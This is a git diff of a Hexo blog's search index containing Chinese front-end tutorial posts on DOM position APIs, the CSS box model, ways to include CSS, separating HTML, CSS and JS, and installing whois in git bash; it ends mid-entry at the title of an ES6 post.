@@ -1,57 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>getBoundingClientRect,clientHeight,scrollHeight等测试</title>
-    <url>/2020/05/07/getBoundingClientRect-clientHeight-scrollHeight%E7%AD%89%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  前面已经测试过部分位置信息了。<br>  <a id="more"></a><br>  <a href="https://zhuanlan.zhihu.com/p/62483585" target="_blank" rel="noopener">Top和Y的部分API测试笔记（一）</a><br>  <a href="https://zhuanlan.zhihu.com/p/62514240" target="_blank" rel="noopener">Top和Y的部分API测试笔记（二）</a><br>  <a href="https://zhuanlan.zhihu.com/p/62519712" target="_blank" rel="noopener">Top和Y的部分API测试笔记（三）和总结</a><br>  今天在做Vue轮子项目的popover组件的时候发现还不够熟悉，直接再写一篇博客加深影响。</p>
-<ul>
-<li>这次测试信息包括：<ul>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect" target="_blank" rel="noopener">getBoundingClientRect</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/scrollY" target="_blank" rel="noopener">window.scrollY</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/offsetTop" target="_blank" rel="noopener">offsetTop</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollHeight" target="_blank" rel="noopener">scrollHeight</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop" target="_blank" rel="noopener">scrollLeft</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop" target="_blank" rel="noopener">scrollTop</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/clientHeight" target="_blank" rel="noopener">clientHeight</a><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><h3 id="HTML代码-不是重点可以不用看"><a href="#HTML代码-不是重点可以不用看" class="headerlink" title="HTML代码(不是重点可以不用看)"></a>HTML代码(不是重点可以不用看)</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>111111111sdfsdfdfsdfsdfsdf111111111111111111111111111111111111111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"c"</span>&gt;</span>11111111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="CSS代码-不是重点可以不用看"><a href="#CSS代码-不是重点可以不用看" class="headerlink" title="CSS代码(不是重点可以不用看)"></a>CSS代码(不是重点可以不用看)</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#a</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">1000px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#b</span>&#123;</span><br><span class="line">  <span class="comment">/* border:1px solid blue; */</span></span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#c</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid green;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="JavaScript代码（主要测试对象）"><a href="#JavaScript代码（主要测试对象）" class="headerlink" title="JavaScript代码（主要测试对象）"></a>JavaScript代码（主要测试对象）</h3></li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><p>第一个测试，主要是测试 getBoundingClientRect返回的属性，它是相对于视口</p>
- <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// console.log(width,height,'b元素距离顶部为'+top,left)</span></span><br><span class="line">b.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span>&#123;width,height,top,left&#125;=b.getBoundingClientRect();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'top为'</span>+top)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  上面是第一个测试，主要是测试 getBoundingClientRect返回的属性，它是相对于视口.</span></span><br><span class="line"><span class="comment">// 注意这里每次点击之后都需要获取值，所以要写到function里面。</span></span><br></pre></td></tr></table></figure></li>
-<li><p>window.scrollY,offsetTop,scrollHeight及getBoundingClientRect返回值之间的关系，这里用到了ES6的语法。因为我的浏览器还存在小数，所以用了四舍五入Math.round()。</p>
-<ul>
-<li>关系测试了两种。分别为：<ul>
-<li>2-1.这只有在竖直方向的竖条没有移动的前提下才满足的情况，也就再最上面的时候</li>
-<li>2-2.在任何条件都可以满足的情况</li>
-</ul>
-</li>
-<li>两种情况看下面代码的注释及<a href="https://jsbin.com/wuhawekose/1/edit?css,js,output" target="_blank" rel="noopener">JSbin代码链接</a>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span>&#123;width,height,top,left&#125;=b.getBoundingClientRect();</span><br><span class="line">  top=<span class="built_in">Math</span>.round(top)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> &#123;<span class="attr">height</span>:cHeight&#125;=c.getBoundingClientRect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bodyHeight=<span class="built_in">document</span>.body.scrollHeight;</span><br><span class="line"><span class="keyword">let</span> bodyWidth=<span class="built_in">document</span>.body.scrollWidth;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight为'</span>+bodyHeight)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'document.body.scrollWidth为'</span>+bodyWidth)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'top+window.scrollY求和为'</span>+(top+<span class="built_in">window</span>.scrollY))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'window.scrollY为'</span>+<span class="built_in">Math</span>.round(<span class="built_in">window</span>.scrollY))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'top为'</span>+top)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'height为'</span>+height)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'cHeight为'</span>+cHeight)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b.offsetTop为'</span>+b.offsetTop)</span><br><span class="line"><span class="comment">//整个页面的高度-c元素的高度-b元素的高度===b元素距离视口上边距的距离</span></span><br><span class="line"><span class="comment">// 这只有在竖直方法的竖条没有移动的前提下才满足，也就再最上面的时候</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.body.scrollHeight-cHeight-height===top)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'这只有在竖直方向的竖条没有移动的前提下才满足'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight-cHeight-height===top成功'</span>)</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//整个页面的高度-c元素的高度-b元素的高度-整个页面竖直方向滚动条移动的距离===b元素距离视口上边距的距离</span></span><br><span class="line"><span class="comment">// 这个在任何条件都可以满足。</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.body.scrollHeight-cHeight-height-<span class="built_in">Math</span>.round(<span class="built_in">window</span>.scrollY)===top)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这个在任何条件都可以满足'</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight-cHeight-height-Math.round(window.scrollY)===top成功'</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//b元素距离视口上边距的距离+垂直方向滚动的距离===b元素顶部相对于其offsetParent元素的顶部的距离</span></span><br><span class="line"><span class="comment">// 任何条件都可以满足。</span></span><br><span class="line">  <span class="keyword">if</span>(top+<span class="built_in">window</span>.scrollY===b.offsetTop)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'任何条件都可以满足'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'top+window.scrollY===b.offsetTop成功'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上面主要测试window.scrollY,offsetTop,scrollHeight</span></span><br><span class="line"><span class="comment">// 及getBoundingClientRect返回值之间的关系。</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>测试scrollLeft和scrollTop</p>
- <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ascrollLeft=a.scrollLeft;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'ascrollLeft为'</span>+ascrollLeft)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a元素滚动后距离左边的距离为'</span>+ascrollLeft)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> bscrollTop=b.scrollTop</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bscrollTop为'</span>+bscrollTop)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'b元素滚动后距离顶部的距离为'</span>+bscrollTop)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试scrollLeft和scrollTop</span></span><br></pre></td></tr></table></figure></li>
-<li><p>scrollHeight,scrollTop,clientHeight之间的关系  </p>
-<p>浏览器要缩小到可以看到拖动吧条，因为我的浏览器还存在小数，所以用了四舍五入<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/round" target="_blank" rel="noopener">Math.round()</a></p>
-<ul>
-<li>分了两种情况：<ul>
-<li>4-1.当b元素竖直方向滚动到最下面的时候才相等</li>
-<li>4-2.当b元素竖直方向没有滚动到最下面，所以不相等 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器要缩小到可以看到拖动吧条，因为我的浏览器还存在小数，所以用了四舍五入。</span></span><br><span class="line"><span class="built_in">document</span>.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">'b元素的整个高度为'</span>+b.scrollHeight)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'b元素的滚动的高度为'</span>+<span class="built_in">Math</span>.round(b.scrollTop))</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'b元素的可视范围高度为'</span>+b.clientHeight)</span><br><span class="line"><span class="comment">// 当b元素竖直方向滚动到最下面的时候才相等</span></span><br><span class="line">  <span class="keyword">if</span>((b.scrollHeight - <span class="built_in">Math</span>.round(b.scrollTop)) === b.clientHeight)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'当b元素竖直方向滚动到最下面的时候才相等'</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'当b元素竖直方向没有滚动到最下面，所以不相等'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//scrollHeight,scrollTop,clientHeight之间的关系</span></span><br></pre></td></tr></table></figure>
-<h3 id="最后附上一个前端使用的大部分位置API的截图说明。"><a href="#最后附上一个前端使用的大部分位置API的截图说明。" class="headerlink" title="最后附上一个前端使用的大部分位置API的截图说明。"></a>最后附上一个前端使用的大部分位置API的截图说明。</h3><img src="https://s1.ax1x.com/2020/05/07/YZh89H.jpg" alt="YZh89H.jpg"></li>
-</ul>
-</li>
-</ul>
-<p>该截图来自于<a href="https://blog.csdn.net/caseywei/article/details/92644503" target="_blank" rel="noopener">Js——ScrollTop、ScrollHeight、ClientHeight、OffsetHeight汇总</a></p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>JavaScript</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2020前端面试题基础篇(CSS)</title>
     <url>/2020/04/28/2020%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E5%9F%BA%E7%A1%80%E7%AF%87(CSS)/</url>
     <content><![CDATA[<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><ul>
@@ -239,53 +188,385 @@ JavaScript<figure class="highlight js"><table><tr><td class="code"><pre><span cl
       </tags>
   </entry>
   <entry>
-    <title>readme</title>
-    <url>/2020/02/03/README/</url>
-    <content><![CDATA[<ul>
-<li>hahaha</li>
+    <title>HTML、CSS、JS内容样式行为分离</title>
+    <url>/2019/05/07/HTML%E3%80%81CSS%E3%80%81JS%E5%86%85%E5%AE%B9%E6%A0%B7%E5%BC%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E7%A6%BB/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一般情况下一个页面，都是由三部分组成：</p>
+<ul>
+<li>HTML负责内容</li>
+<li>CSS负责样式</li>
+<li>JavaScript负责行为<br>虽然可以混用，但一般情况是不建议混成一团来使用。<a id="more"></a>
+<h2 id="如果HTML文件表示样式。"><a href="#如果HTML文件表示样式。" class="headerlink" title="如果HTML文件表示样式。"></a>如果HTML文件表示样式。</h2><img src="https://s1.ax1x.com/2020/05/08/Ynje3R.jpg" alt="Ynje3R.jpg"><br>上图中就显示出本该负责内容结构的HTML上有很多无用的标签，会让HTML代码显的很复杂。</li>
 </ul>
+<p>本来body标签里面就只有两个字——你好。</p>
+<p>但是又用了center，font，color。</p>
+<p>这样有些标签就表示内容，有些标签就表示样式，如果代码更多，就很难区分标签真正的逻辑结构。</p>
+<h2 id="如果CSS用来表示内容"><a href="#如果CSS用来表示内容" class="headerlink" title="如果CSS用来表示内容"></a>如果CSS用来表示内容</h2><p>下图用CSS生成的文字用鼠标（人类）选择是无法选中的，只有HTML生成的文字可以选中。用到了CSS的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content" target="_blank" rel="noopener">content属性</a><br><img src="https://s1.ax1x.com/2020/05/08/YnjE4J.jpg" alt="YnjE4J.jpg"><br>不仅如此，CSS生成的文字内容也无法用JavaScript获取到。<br><img src="https://s1.ax1x.com/2020/05/08/Ynjmg1.jpg" alt="Ynjmg1.jpg"><br>所以用CSS生成文字内容会显得很麻烦。</p>
+<h2 id="如果用CSS来控制行为"><a href="#如果用CSS来控制行为" class="headerlink" title="如果用CSS来控制行为"></a>如果用CSS来控制行为</h2><p>CSS以前有一个CSS expression（也就是CSS的表达式），但是现在我查询到的关于CSS的expression的博客都是五年前的了，而且expression也已经从标准中查询不到了。</p>
+<p>从IE5开始得到支持，后因标准、性能、安全性等问题，微软从IE8 beta2标准模式开始，取消对css expression的支持。</p>
+<p>它除了让CSS负责样式以外，还让CSS来负责行为逻辑，导致CSS运行变慢，页面就会变慢，违反了页面优化的一个原则——就是不要在CSS中使用expression，它还暴露了脚本执行的上下文，可能带来脚本注入的隐患。</p>
+<h2 id="如果用JS来控制样式"><a href="#如果用JS来控制样式" class="headerlink" title="如果用JS来控制样式"></a>如果用JS来控制样式</h2><p>用jQuery中的API测试——<a href="https://www.jquery123.com/show/" target="_blank" rel="noopener">show()</a>和<a href="https://www.jquery123.com/hide/" target="_blank" rel="noopener">hide()</a><br>当原本的CSS中设置display:flex的时候，先用hide()，再用show()后会把<strong>它原本的display</strong>给显示出来。<br><img src="https://s1.ax1x.com/2020/05/08/YnjAN4.jpg" alt="YnjAN4.jpg"><br>当原本的CSS中display:block的时候，先用hide()，再用show()后会把<strong>它原本的display</strong>给显示出来。<br><img src="https://s1.ax1x.com/2020/05/08/YnjMDK.jpg" alt="YnjMDK.jpg"><br><strong>但是</strong>当原本的CSS中display:inline-block的时候，先用hide()，再用show()后会把<strong>display:block覆盖原本的display:inline-block。</strong><br><img src="https://s1.ax1x.com/2020/05/08/Ynjnjx.jpg" alt="Ynjnjx.jpg"><br>当原本的CSS中display:none的时候，先用hide()，再用show()后会把<strong>display:block覆盖原本的display:none。</strong><br><img src="https://s1.ax1x.com/2020/05/08/YnjKu6.jpg" alt="YnjKu6.jpg"><br>所以上面用JS来控制样式就显得很不可靠，你要去猜用JS控制之后可能变成了并不是你原本的样式。<br>所以应该用JS来控制行为，比如添加一个类:</p>
+<ol>
+<li><p>addClass（’active’），激活某个CSS类；</p>
+</li>
+<li><p>addClass（’deactive’），不激活某个CSS类；</p>
+</li>
+<li><p>addClass（’disable’），不激活某个CSS类。<br>等等添加删除class的操作。</p>
+</li>
+</ol>
+<p>这样就用JS来控制一个语义化的变量名来代表状态即可。不用来描述是否显示样式（也就是是否能够看见），只用来描述是一个打开/关闭状态或者正面/负面状态。至于打开/关闭和正面/负面的状态的样式是什么样子的JS不管，给CSS负责。</p>
+<p>所以尽量让HTML负责内容，CSS负责样式，JavaScript负责行为。</p>
 ]]></content>
+      <categories>
+        <category>CSS</category>
+        <category>HTML</category>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>CSS</tag>
+        <tag>HTML</tag>
+        <tag>JavaScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git bash安装whois</title>
+    <url>/2019/02/05/bash%E5%AE%89%E8%A3%85whois/</url>
+    <content><![CDATA[<p>Whois，通常来说，就是一个用于查询域名是否已经被注册，以及注册域名的详细信息（如域名所有人、域名注册商、域名注册日期和过期日期等）的工具。<br>当然，现在已经有各种网页版查看 whois 信息的工具，但是很多时候网页查询有附加条件，比如输入验证码或者不支持的后缀等，比较低效。因此在命令行下使用 whois 命令来直接获得域名的 whois 信息。</p>
+<a id="more"></a>
+<p>需要输入 npm i -g whois在git bash里面安装whois即可<br><img src="https://s1.ax1x.com/2020/05/08/Yugfdf.png" alt="Yugfdf.png"><br>输入whois +一级域名就可以查询域名信息了<br><img src="https://s1.ax1x.com/2020/05/08/YugWeP.png" alt="YugWeP.png"></p>
+]]></content>
+      <categories>
+        <category>git bash</category>
+      </categories>
+      <tags>
+        <tag>git bash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>content-box 与 border-box</title>
+    <url>/2019/01/20/content-box%20%E4%B8%8E%20border-box/</url>
+    <content><![CDATA[<h2 id="content-box"><a href="#content-box" class="headerlink" title="content-box"></a>content-box</h2><p>content-box——内容宽高为100×100，</p>
+<a id="more"></a>
+<p>所以元素宽高为100×100（content）+2×[10×0(padding)+ 1×1(border)</p>
+<p>+0×0(margin)]=122×102（宽×高）<br><img src="https://s1.ax1x.com/2020/05/08/YudUNn.jpg" alt="YudUNn.jpg"></p>
+<h2 id="border-box"><a href="#border-box" class="headerlink" title="border-box"></a>border-box</h2><p>border-box——内容宽高为78×98，</p>
+<p>所以元素宽高为78×98（content）+2×[10×0(padding)+ 1×1(border)</p>
+<p>+0×0(margin)]=100×100（宽×高）<br><img src="https://s1.ax1x.com/2020/05/08/YudNAs.jpg" alt="YudNAs.jpg"><br>可以看到字体内容宽度不够了，变成了两行。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>设置高宽分别为100×100：</p>
+<ol>
+<li><p>content-box——会使内容宽高为100×100；</p>
+</li>
+<li><p>border-box——会使border（包括border宽高）以内的宽高为100×100。</p>
+</li>
+<li><p>由于inline元素无法设置宽高，所以inline元素这content-box和border-box两个属性没</p>
+</li>
+</ol>
+<p>有效果。</p>
+]]></content>
+      <categories>
+        <category>CSS</category>
+      </categories>
       <tags>
         <tag>CSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2013/07/13/hello-world/</url>
-    <content><![CDATA[<p>updated: 2018-01-01 12:00:00<br>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<a id="more"></a>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+    <title>CSS的引入方式笔记</title>
+    <url>/2019/01/01/CSS%E7%9A%84%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="CSS一共有五种引用方式。"><a href="#CSS一共有五种引用方式。" class="headerlink" title="CSS一共有五种引用方式。"></a>CSS一共有五种引用方式。</h2><a id="more"></a>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-<p><img src="https://static.xiedaimala.com/xdml/image/02c5b19d-3b0e-47a8-a93b-301578c0f039/2019-4-8-10-45-40.png" alt=""></p>
+<h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>直接在body、h1等标签里面写标签或者属性，这种叫做，不过这种基本已经废弃了：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">'grey'</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--——body的背景颜色为红色；--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">'red'</span>&gt;</span>哈哈<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--——hi标签居中，并且颜色为红色--&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="style内联样式"><a href="#style内联样式" class="headerlink" title="style内联样式"></a>style内联样式</h3><p>在body、h1等标签里面写上style，这种叫做style属性，把样式写在标签上，也叫所style内联样式，这种方式会导致html代码冗长：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"background-color: grey"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    ——body的背景颜色为灰色；--&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">'text-align: center; color: red;'</span>&gt;</span>哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    ——hi标签剧中，并且颜色为红色。这里一个style=后面把里面的属性都放到引号里面包起来。以英文的分号;隔开各个属性。--&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="style嵌入式"><a href="#style嵌入式" class="headerlink" title="style嵌入式"></a>style嵌入式</h3><p>一般在head标签里面写一个style标签，不写在head标签里面也可以，这种叫做style嵌入式。这种方式会使标签变得比较简洁，但是也会导致html代码冗长，但是可以集中看到css样式。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line">        background-color: grey</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        h1&#123;</span><br><span class="line">        text-align: center; color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="style外部式"><a href="#style外部式" class="headerlink" title="style外部式"></a>style外部式</h3><p>style外部式，通过html文件外部引入一个CSS，也就是把第三种方法中的style放到html意外的CSS中去即可，这样会使html代码变得简洁很多。这种是现在用的最多的，但是html中需要写入引用代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>rel就是relationship（关系），CSS就是一种stylesheet，引用到./就是当前目录下的style.css文件。<br>通过在该文件夹下使用git bash，输入http-server -c -1来是使用http协议打开<br><img src="https://s1.ax1x.com/2020/05/08/YusGuV.jpg" alt="YusGuV.jpg"><br>输入<a href="http://192.168.1.2:8080就可以使用http协议打开，看到html.html通过了get请求得到style.css">http://192.168.1.2:8080就可以使用http协议打开，看到html.html通过了get请求得到style.css</a><br><img src="https://s1.ax1x.com/2020/05/08/YusJBT.jpg" alt="YusJBT.jpg"></p>
+<h3 id="CSS里面引入另外一CSS"><a href="#CSS里面引入另外一CSS" class="headerlink" title="CSS里面引入另外一CSS"></a>CSS里面引入另外一CSS</h3><p>用的不多，就是</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(./b.css);</span><br></pre></td></tr></table></figure>
+<p>括号里面先对路径和绝对路劲都可以。<br><img src="https://s1.ax1x.com/2020/05/08/Yus3j0.jpg" alt="Yus3j0.jpg"></p>
 ]]></content>
       <categories>
-        <category>JS</category>
-        <category>TS</category>
+        <category>CSS</category>
+      </categories>
+      <tags>
+        <tag>CSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>html代码中的空格笔记</title>
+    <url>/2019/03/02/html%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E7%A9%BA%E6%A0%BC%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>html代码的标签之间只要有大于等于一个空格，在浏览器中所呈现出来的都会出现一个空格。</p>
+<a id="more"></a>
+
+
+<p>但是如果标签之间没有空格，在浏览器中所呈现出来的也就没有空格。</p>
+<p>有时候觉得这个空格比较大，可以使用盒模型来控制和修改间隙大小。<br><img src="https://s1.ax1x.com/2020/05/08/YuByDS.png" alt="YuByDS.png"><br>但是以上的代码用JS生成就不会出现空格。</p>
+]]></content>
+      <categories>
+        <category>HTML</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ES6解构赋值</title>
